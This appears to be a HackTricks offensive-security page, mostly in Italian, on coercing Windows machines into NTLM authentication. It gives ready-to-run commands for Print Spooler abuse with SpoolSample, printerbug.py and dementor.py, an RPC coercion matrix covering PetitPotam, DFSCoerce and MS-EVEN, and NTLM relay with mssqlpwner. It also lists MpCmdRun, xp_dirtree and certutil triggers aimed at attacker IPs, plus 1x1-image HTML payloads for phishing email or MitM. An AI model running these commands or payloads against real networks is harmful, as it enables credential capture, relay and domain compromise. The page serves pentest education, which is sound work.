# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) è una **collezione** di **trigger di autenticazione remota** scritti in C# usando il compilatore MIDL per evitare dipendenze di terze parti.

## Spooler Service Abuse

If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
Nota: quando una stampante invia la notifica a sistemi arbitrari, deve **autenticarsi presso** quel **sistema**. Pertanto, un attacker può far sì che il servizio _**Print Spooler**_ si autentichi presso un sistema arbitrario, e il servizio **utilizzerà l'account del computer** in questa autenticazione.

### Individuare i server Windows nel dominio

Usando PowerShell, ottieni una lista di macchine Windows. I server sono di solito la priorità, quindi concentriamoci su quelli:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Individuare servizi Spooler in ascolto

Usando una versione leggermente modificata dello [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) di @mysmartlogin (Vincent Le Toux), verifica se il servizio Spooler è in ascolto:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Puoi anche usare rpcdump.py su Linux e cercare il MS-RPRN Protocol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Richiedere al servizio di autenticarsi verso un host arbitrario

Puoi compilare [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oppure usa [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se sei su Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinare con Unconstrained Delegation

Se un attacker ha già compromesso un computer con [Unconstrained Delegation](unconstrained-delegation.md), l'attacker potrebbe **forzare la stampante ad autenticarsi contro questo computer**. A causa dell'unconstrained delegation, il **TGT** dell'**account computer della stampante** verrà **salvato nella** **memoria** del computer con unconstrained delegation. Poiché l'attacker ha già compromesso questo host, sarà in grado di **recuperare questo ticket** e abusarne ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Nota: questi metodi accettano parametri che possono contenere un percorso UNC (es., `\\attacker\share`). Quando elaborato, Windows si autenticherà (contesto macchina/utente) verso quell'UNC, permettendo la cattura o il relay di NetNTLM.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.

By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.

## All'interno di Windows

Se sei già all'interno della macchina Windows puoi forzare Windows a connettersi a un server usando account privilegiati con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oppure usa questa altra tecnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

È possibile usare certutil.exe lolbin (Microsoft-signed binary) per forzare l'autenticazione NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Se conosci l'**email address** dell'utente che effettua l'accesso a una macchina che vuoi compromettere, puoi semplicemente inviargli un'**email with a 1x1 image** come
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
e quando lo apre, cercherà di autenticarsi.

### MitM

Se riesci a eseguire un attacco MitM verso un computer e a inserire HTML in una pagina che visualizzerà, puoi provare a inserire un'immagine come la seguente nella pagina:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Altri modi per forzare e fare phishing dell'autenticazione NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Se puoi catturare [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Ricorda che, per crackare NTLMv1, è necessario impostare il Responder challenge a "1122334455667788"_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
